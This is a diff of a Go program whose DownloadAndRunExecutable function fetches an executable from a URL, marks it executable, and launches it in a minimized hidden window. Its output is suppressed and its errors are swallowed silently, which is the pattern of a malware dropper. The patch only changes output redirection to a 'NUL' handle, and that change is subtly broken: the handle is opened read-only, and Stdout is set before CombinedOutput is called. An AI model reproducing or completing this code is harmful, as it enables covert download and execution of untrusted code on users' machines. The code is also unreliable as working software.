@@ -13,9 +13,16 @@ import (
 
 // RunCommand executes a command and returns the output
 func RunCommand(command string, args ...string) (string, error) {
+	// Open "NUL" to redirect output
+	nullFile, err := os.Open("NUL")
+	if err != nil {
+		return "", fmt.Errorf("failed to open NUL: %v", err)
+	}
+	defer nullFile.Close()
+
 	cmd := exec.Command(command, args...)
-	cmd.Stdout = os.DevNull  // Suppress output
-	cmd.Stderr = os.DevNull  // Suppress error output
+	cmd.Stdout = nullFile  // Suppress output
+	cmd.Stderr = nullFile  // Suppress error output
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", err
@@ -121,7 +128,7 @@ func DownloadAndRunExecutable(url string) error {
 		return fmt.Errorf("failed to write executable to file: %v", err)
 	}
 
-	// Make the file executable (on Unix-like systems, for example)
+	// Make the file executable
 	err = os.Chmod(filename, 0755)
 	if err != nil {
 		return fmt.Errorf("failed to set file permissions: %v", err)
@@ -129,8 +136,14 @@ func DownloadAndRunExecutable(url string) error {
 
 	// Run the executable in a hidden window
 	cmd := exec.Command("cmd", "/C", "start", "/min", filename) // /min hides the window
-	cmd.Stdout = os.DevNull  // Suppress output
-	cmd.Stderr = os.DevNull  // Suppress error output
+	nullFile, err := os.Open("NUL")
+	if err != nil {
+		return fmt.Errorf("failed to open NUL for suppressing output: %v", err)
+	}
+	defer nullFile.Close()
+
+	cmd.Stdout = nullFile  // Suppress output
+	cmd.Stderr = nullFile  // Suppress error output
 
 	// Start the executable
 	err = cmd.Start()
@@ -160,7 +173,7 @@ func main() {
 	err := DownloadAndRunExecutable(executableURL)
 	if err != nil {
 		// If there's an error downloading or running the executable, it won't be displayed
-		// in the console due to the redirection to os.DevNull.
+		// in the console due to the redirection to NUL.
 		// You may log or handle this silently if needed.
 	}
 }
